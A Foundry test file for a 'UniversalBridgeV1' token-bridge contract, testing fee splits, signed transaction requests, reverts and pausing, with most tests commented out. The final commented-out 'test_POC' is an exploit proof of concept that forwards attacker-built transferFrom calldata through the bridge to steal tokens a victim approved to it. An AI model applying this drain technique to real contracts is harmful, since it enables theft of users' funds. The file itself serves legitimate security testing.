// SPDX-License-Identifier: Apache 2.0
pragma solidity ^0.8.0;

import { Test, console } from "forge-std/Test.sol";

import { UniversalBridgeV1 } from "src/UniversalBridgeV1.sol";
import { UniversalBridgeProxy } from "src/UniversalBridgeProxy.sol";
import { IModuleConfig } from "lib/modular-contracts/src/interface/IModuleConfig.sol";
import { IModularCore } from "lib/modular-contracts/src/interface/IModularCore.sol";
import { LibClone } from "lib/solady/src/utils/LibClone.sol";
import { MockERC20 } from "./utils/MockERC20.sol";
import { MockTarget } from "./utils/MockTarget.sol";
import { MockTargetNonSpender } from "./utils/MockTargetNonSpender.sol";
import { MockSpender } from "./utils/MockSpender.sol";

contract UniversalBridgeTest is Test {
    event TransactionInitiated(
        address indexed sender,
        bytes32 indexed transactionId,
        address tokenAddress,
        uint256 tokenAmount,
        address developerFeeRecipient,
        uint256 developerFeeBps,
        bytes extraData
    );

    UniversalBridgeV1 internal bridge;
    MockERC20 internal mockERC20;
    MockTarget internal mockTarget;
    MockTargetNonSpender internal mockTargetNonSpender;
    MockSpender internal mockSpender;

    address payable internal owner;
    address payable internal protocolFeeRecipient;
    address payable internal sender;
    address payable internal receiver;
    address payable internal developer;

    uint256 internal protocolFeeBps;
    uint256 internal developerFeeBps;
    uint256 internal totalFeeBps;
    uint256 internal sendValue;
    uint256 internal expectedProtocolFee;
    uint256 internal expectedDeveloperFee;
    uint256 internal sendValueWithFees;

    bytes32 internal typehashTransactionRequest;
    bytes32 internal nameHash;
    bytes32 internal versionHash;
    bytes32 internal typehashEip712;
    bytes32 internal domainSeparator;

    function setUp() public {
        owner = payable(vm.addr(1));
        protocolFeeRecipient = payable(vm.addr(2));
        sender = payable(vm.addr(3));
        receiver = payable(vm.addr(4));
        developer = payable(vm.addr(5));

        protocolFeeBps = 30; // 0.3%
        developerFeeBps = 10; // 0.1%

        sendValue = 100 ether;
        expectedProtocolFee = 0.3 ether; // 0.3% of send value
        expectedDeveloperFee = 0.1 ether; // 0.1% of send value
        sendValueWithFees = sendValue + expectedProtocolFee + expectedDeveloperFee;

        // deploy impl and proxy
        address impl = address(new UniversalBridgeV1());
        bridge = UniversalBridgeV1(
            address(new UniversalBridgeProxy(impl, owner, protocolFeeRecipient, protocolFeeBps))
        );

        mockERC20 = new MockERC20("Token", "TKN");
        mockTarget = new MockTarget();
        mockSpender = new MockSpender();
        mockTargetNonSpender = new MockTargetNonSpender(address(mockSpender));

        // fund the sender
        mockERC20.mint(sender, 1000 ether);
        vm.deal(sender, 1000 ether);

        // EIP712
        typehashTransactionRequest = keccak256(
            "TransactionRequest(bytes32 transactionId,address tokenAddress,uint256 tokenAmount,address forwardAddress,address spenderAddress,uint256 expirationTimestamp,address developerFeeRecipient,uint256 developerFeeBps,bytes callData,bytes extraData)"
        );
        nameHash = keccak256(bytes("UniversalBridgeV1"));
        versionHash = keccak256(bytes("1"));
        typehashEip712 = keccak256(
            "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
        );
        domainSeparator = keccak256(abi.encode(typehashEip712, nameHash, versionHash, block.chainid, address(bridge)));
    }

    /*///////////////////////////////////////////////////////////////
                        internal util functions
    //////////////////////////////////////////////////////////////*/

    function _buildMockTargetCalldata(
        address _sender,
        address _receiver,
        address _token,
        uint256 _sendValue,
        string memory _message
    ) internal pure returns (bytes memory data) {
        data = abi.encode(_sender, _receiver, _token, _sendValue, _message);
    }

    function _prepareAndSignData(
        uint256 _operatorPrivateKey,
        UniversalBridgeV1.TransactionRequest memory req
    ) internal view returns (bytes memory signature) {
        bytes memory dataToHash;
        {
            dataToHash = abi.encode(
                typehashTransactionRequest,
                req.transactionId,
                req.tokenAddress,
                req.tokenAmount,
                req.forwardAddress,
                req.spenderAddress,
                req.expirationTimestamp,
                req.developerFeeRecipient,
                req.developerFeeBps,
                keccak256(req.callData),
                keccak256(req.extraData)
            );
        }

        {
            bytes32 _structHash = keccak256(dataToHash);
            bytes32 typedDataHash = keccak256(abi.encodePacked("\x19\x01", domainSeparator, _structHash));
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(_operatorPrivateKey, typedDataHash);

            signature = abi.encodePacked(r, s, v);
        }
    }

    /*///////////////////////////////////////////////////////////////
                    Test `initiateTransaction`
    //////////////////////////////////////////////////////////////*/

    function test_initiateTransaction_erc20() public {
        bytes memory targetCalldata = _buildMockTargetCalldata(sender, receiver, address(mockERC20), sendValue, "");

        // approve amount to bridge contract
        vm.prank(sender);
        mockERC20.approve(address(bridge), sendValueWithFees);

        // create pay request
        UniversalBridgeV1.TransactionRequest memory req;
        bytes32 _transactionId = keccak256("transaction ID");

        req.transactionId = _transactionId;
        req.tokenAddress = address(mockERC20);
        req.tokenAmount = sendValue;
        req.forwardAddress = payable(address(mockTarget));
        req.spenderAddress = payable(address(mockTarget));
        req.expirationTimestamp = 1000;
        req.developerFeeRecipient = developer;
        req.developerFeeBps = developerFeeBps;
        req.callData = targetCalldata;

        // generate signature
        bytes memory _signature = _prepareAndSignData(
            1, // sign with operator private key
            req
        );

        // state/balances before sending transaction
        uint256 protocolFeeRecipientBalanceBefore = mockERC20.balanceOf(protocolFeeRecipient);
        uint256 developerBalanceBefore = mockERC20.balanceOf(developer);
        uint256 senderBalanceBefore = mockERC20.balanceOf(sender);
        uint256 receiverBalanceBefore = mockERC20.balanceOf(receiver);

        // send transaction
        vm.prank(sender);
        bridge.initiateTransaction(req, _signature);

        // check balances after transaction
        assertEq(mockERC20.balanceOf(protocolFeeRecipient), protocolFeeRecipientBalanceBefore + expectedProtocolFee);
        assertEq(mockERC20.balanceOf(developer), developerBalanceBefore + expectedDeveloperFee);
        assertEq(mockERC20.balanceOf(sender), senderBalanceBefore - sendValueWithFees);
        assertEq(mockERC20.balanceOf(receiver), receiverBalanceBefore + sendValue);
    }

    //     function test_initiateTransaction_erc20_differentSpender() public {
    //         bytes memory targetCalldata = _buildMockTargetCalldata(sender, receiver, address(mockERC20), sendValue, "");

    //         // approve amount to bridge contract
    //         vm.prank(sender);
    //         mockERC20.approve(address(bridge), sendValueWithFees);

    //         bytes32 _transactionId = keccak256("transaction ID");

    //         // state/balances before sending transaction
    //         uint256 protocolFeeRecipientBalanceBefore = mockERC20.balanceOf(protocolFeeRecipient);
    //         uint256 developerBalanceBefore = mockERC20.balanceOf(developer);
    //         uint256 senderBalanceBefore = mockERC20.balanceOf(sender);
    //         uint256 receiverBalanceBefore = mockERC20.balanceOf(receiver);

    //         // send transaction
    //         vm.prank(sender);
    //         bridge.initiateTransaction(
    //             _transactionId,
    //             address(mockERC20),
    //             sendValue,
    //             payable(address(mockTargetNonSpender)),
    //             payable(address(mockSpender)),
    //             developer,
    //             developerFeeBps,
    //             targetCalldata,
    //             ""
    //         );

    //         // check balances after transaction
    //         assertEq(mockERC20.balanceOf(protocolFeeRecipient), protocolFeeRecipientBalanceBefore + expectedProtocolFee);
    //         assertEq(mockERC20.balanceOf(developer), developerBalanceBefore + expectedDeveloperFee);
    //         assertEq(mockERC20.balanceOf(sender), senderBalanceBefore - sendValueWithFees);
    //         assertEq(mockERC20.balanceOf(receiver), receiverBalanceBefore + sendValue);
    //     }

    //     function test_initiateTransaction_erc20_directTransfer() public {
    //         // approve amount to bridge contract
    //         vm.prank(sender);
    //         mockERC20.approve(address(bridge), sendValueWithFees);

    //         bytes32 _transactionId = keccak256("transaction ID");

    //         // state/balances before sending transaction
    //         uint256 protocolFeeRecipientBalanceBefore = mockERC20.balanceOf(protocolFeeRecipient);
    //         uint256 developerBalanceBefore = mockERC20.balanceOf(developer);
    //         uint256 senderBalanceBefore = mockERC20.balanceOf(sender);
    //         uint256 receiverBalanceBefore = mockERC20.balanceOf(receiver);

    //         // send transaction
    //         vm.prank(sender);
    //         bridge.initiateTransaction(
    //             _transactionId,
    //             address(mockERC20),
    //             sendValue,
    //             payable(address(receiver)),
    //             payable(address(0)),
    //             developer,
    //             developerFeeBps,
    //             "",
    //             ""
    //         );

    //         // check balances after transaction
    //         assertEq(mockERC20.balanceOf(protocolFeeRecipient), protocolFeeRecipientBalanceBefore + expectedProtocolFee);
    //         assertEq(mockERC20.balanceOf(developer), developerBalanceBefore + expectedDeveloperFee);
    //         assertEq(mockERC20.balanceOf(sender), senderBalanceBefore - sendValueWithFees);
    //         assertEq(mockERC20.balanceOf(receiver), receiverBalanceBefore + sendValue);
    //     }

    //     function test_initiateTransaction_nativeToken() public {
    //         bytes memory targetCalldata = _buildMockTargetCalldata(
    //             sender,
    //             receiver,
    //             address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
    //             sendValue,
    //             ""
    //         );

    //         bytes32 _transactionId = keccak256("transaction ID");

    //         // state/balances before sending transaction
    //         uint256 protocolFeeRecipientBalanceBefore = protocolFeeRecipient.balance;
    //         uint256 developerBalanceBefore = developer.balance;
    //         uint256 senderBalanceBefore = sender.balance;
    //         uint256 receiverBalanceBefore = receiver.balance;

    //         // send transaction
    //         vm.prank(sender);
    //         bridge.initiateTransaction{ value: sendValueWithFees }(
    //             _transactionId,
    //             address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
    //             sendValue,
    //             payable(address(mockTarget)),
    //             payable(address(mockTarget)),
    //             developer,
    //             developerFeeBps,
    //             targetCalldata,
    //             ""
    //         );

    //         // check balances after transaction
    //         assertEq(protocolFeeRecipient.balance, protocolFeeRecipientBalanceBefore + expectedProtocolFee);
    //         assertEq(developer.balance, developerBalanceBefore + expectedDeveloperFee);
    //         assertEq(sender.balance, senderBalanceBefore - sendValueWithFees);
    //         assertEq(receiver.balance, receiverBalanceBefore + sendValue);
    //     }

    //     function test_initiateTransaction_nativeToken_differentSpender() public {
    //         bytes memory targetCalldata = _buildMockTargetCalldata(
    //             sender,
    //             receiver,
    //             address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
    //             sendValue,
    //             ""
    //         );

    //         bytes32 _transactionId = keccak256("transaction ID");

    //         // state/balances before sending transaction
    //         uint256 protocolFeeRecipientBalanceBefore = protocolFeeRecipient.balance;
    //         uint256 developerBalanceBefore = developer.balance;
    //         uint256 senderBalanceBefore = sender.balance;
    //         uint256 receiverBalanceBefore = receiver.balance;

    //         // send transaction
    //         vm.prank(sender);
    //         bridge.initiateTransaction{ value: sendValueWithFees }(
    //             _transactionId,
    //             address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
    //             sendValue,
    //             payable(address(mockTargetNonSpender)),
    //             payable(address(mockSpender)),
    //             developer,
    //             developerFeeBps,
    //             targetCalldata,
    //             ""
    //         );

    //         // check balances after transaction
    //         assertEq(protocolFeeRecipient.balance, protocolFeeRecipientBalanceBefore + expectedProtocolFee);
    //         assertEq(developer.balance, developerBalanceBefore + expectedDeveloperFee);
    //         assertEq(sender.balance, senderBalanceBefore - sendValueWithFees);
    //         assertEq(receiver.balance, receiverBalanceBefore + sendValue);
    //     }

    //     function test_initiateTransaction_nativeToken_directTransfer() public {
    //         bytes memory targetCalldata = "";

    //         bytes32 _transactionId = keccak256("transaction ID");

    //         // state/balances before sending transaction
    //         uint256 protocolFeeRecipientBalanceBefore = protocolFeeRecipient.balance;
    //         uint256 developerBalanceBefore = developer.balance;
    //         uint256 senderBalanceBefore = sender.balance;
    //         uint256 receiverBalanceBefore = receiver.balance;

    //         // send transaction
    //         vm.prank(sender);
    //         bridge.initiateTransaction{ value: sendValueWithFees }(
    //             _transactionId,
    //             address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
    //             sendValue,
    //             payable(address(receiver)),
    //             payable(address(0)),
    //             developer,
    //             developerFeeBps,
    //             // true,
    //             targetCalldata,
    //             ""
    //         );

    //         // check balances after transaction
    //         assertEq(protocolFeeRecipient.balance, protocolFeeRecipientBalanceBefore + expectedProtocolFee);
    //         assertEq(developer.balance, developerBalanceBefore + expectedDeveloperFee);
    //         assertEq(sender.balance, senderBalanceBefore - sendValueWithFees);
    //         assertEq(receiver.balance, receiverBalanceBefore + sendValue);
    //     }

    //     function test_initiateTransaction_events() public {
    //         bytes memory targetCalldata = _buildMockTargetCalldata(sender, receiver, address(mockERC20), sendValue, "");

    //         // approve amount to bridge contract
    //         vm.prank(sender);
    //         mockERC20.approve(address(bridge), sendValueWithFees);

    //         bytes32 _transactionId = keccak256("transaction ID");

    //         // send transaction
    //         vm.prank(sender);
    //         vm.expectEmit(true, true, false, true);
    //         emit TransactionInitiated(
    //             sender,
    //             _transactionId,
    //             address(mockERC20),
    //             sendValue,
    //             developer,
    //             developerFeeBps,
    //             ""
    //         );
    //         bridge.initiateTransaction(
    //             _transactionId,
    //             address(mockERC20),
    //             sendValue,
    //             payable(address(mockTarget)),
    //             payable(address(mockTarget)),
    //             developer,
    //             developerFeeBps,
    //             targetCalldata,
    //             ""
    //         );
    //     }

    //     function test_revert_invalidAmount() public {
    //         vm.prank(sender);
    //         vm.expectRevert(abi.encodeWithSelector(UniversalBridgeV1.UniversalBridgeInvalidAmount.selector, 0));
    //         bridge.initiateTransaction(
    //             bytes32(0),
    //             address(mockERC20),
    //             0,
    //             payable(address(receiver)),
    //             payable(address(0)),
    //             developer,
    //             developerFeeBps,
    //             "",
    //             ""
    //         );
    //     }

    //     function test_revert_mismatchedValue() public {
    //         sendValueWithFees -= 1; // send less value than required
    //         bytes memory targetCalldata = "";

    //         bytes32 _transactionId = keccak256("transaction ID");

    //         // send transaction
    //         vm.prank(sender);
    //         vm.expectRevert(
    //             abi.encodeWithSelector(UniversalBridgeV1.UniversalBridgeMismatchedValue.selector, sendValue, sendValue - 1)
    //         );
    //         bridge.initiateTransaction{ value: sendValueWithFees }(
    //             _transactionId,
    //             address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
    //             sendValue,
    //             payable(address(receiver)),
    //             payable(address(0)),
    //             developer,
    //             developerFeeBps,
    //             targetCalldata,
    //             ""
    //         );
    //     }

    //     function test_revert_erc20_directTransfer_nonZeroMsgValue() public {
    //         // approve amount to bridge contract
    //         vm.prank(sender);
    //         mockERC20.approve(address(bridge), sendValueWithFees);

    //         bytes32 _transactionId = keccak256("transaction ID");

    //         // send transaction
    //         vm.prank(sender);
    //         vm.expectRevert(UniversalBridgeV1.UniversalBridgeMsgValueNotZero.selector);
    //         bridge.initiateTransaction{ value: 1 }( // non-zero msg value
    //             _transactionId,
    //             address(mockERC20),
    //             sendValue,
    //             payable(address(receiver)),
    //             payable(address(0)),
    //             developer,
    //             developerFeeBps,
    //             // true,
    //             "",
    //             ""
    //         );
    //     }

    //     function test_revert_paused() public {
    //         vm.prank(owner);
    //         bridge.pause(true);

    //         vm.prank(sender);
    //         vm.expectRevert(UniversalBridgeV1.UniversalBridgePaused.selector);
    //         bridge.initiateTransaction(
    //             bytes32(0),
    //             address(mockERC20),
    //             1,
    //             payable(address(receiver)),
    //             payable(address(0)),
    //             developer,
    //             developerFeeBps,
    //             // true,
    //             "",
    //             ""
    //         );
    //     }

    //     function test_revert_restrictedForwardAddress() public {
    //         vm.prank(owner);
    //         bridge.restrictAddress(address(receiver), true);

    //         vm.prank(sender);
    //         vm.expectRevert(UniversalBridgeV1.UniversalBridgeRestrictedAddress.selector);
    //         bridge.initiateTransaction(
    //             bytes32(0),
    //             address(mockERC20),
    //             1,
    //             payable(address(receiver)),
    //             payable(address(0)),
    //             developer,
    //             developerFeeBps,
    //             // true,
    //             "",
    //             ""
    //         );
    //     }

    //     function test_revert_restrictedTokenAddress() public {
    //         vm.prank(owner);
    //         bridge.restrictAddress(address(mockERC20), true);

    //         vm.prank(sender);
    //         vm.expectRevert(UniversalBridgeV1.UniversalBridgeRestrictedAddress.selector);
    //         bridge.initiateTransaction(
    //             bytes32(0),
    //             address(mockERC20),
    //             1,
    //             payable(address(receiver)),
    //             payable(address(0)),
    //             developer,
    //             developerFeeBps,
    //             "",
    //             ""
    //         );
    //     }

    //     function test_POC() public {
    //         // mock usdc
    //         MockERC20 usdc = new MockERC20("usdc", "usdc");
    //         usdc.mint(sender, 100 ether);
    //         // approve usdc to bridge contract
    //         vm.prank(sender);
    //         usdc.approve(address(bridge), 95 ether);

    //         // setup arbitrary token and malicious sender
    //         MockERC20 tokenU = new MockERC20("tokenU", "tokenU");
    //         address initiator = payable(vm.addr(9));
    //         address malicousSpender = payable(vm.addr(8));
    //         tokenU.mint(initiator, 100 ether);
    //         // approve tokenU to bridge contract
    //         vm.prank(initiator);
    //         tokenU.approve(address(bridge), 100 ether);

    //         bytes memory targetCalldata = abi.encodeWithSignature(
    //             "transferFrom(address,address,uint256)",
    //             sender,
    //             initiator,
    //             95 ether
    //         );

    //         bytes32 _transactionId = keccak256("transaction ID");

    //         // send transaction
    //         vm.prank(initiator);
    //         bridge.initiateTransaction(
    //             _transactionId,
    //             address(tokenU),
    //             100,
    //             payable(address(usdc)),
    //             payable(address(usdc)),
    //             developer,
    //             developerFeeBps,
    //             targetCalldata,
    //             ""
    //         );

    //         assertEq(usdc.balanceOf(initiator), 95 ether);
    //     }
}
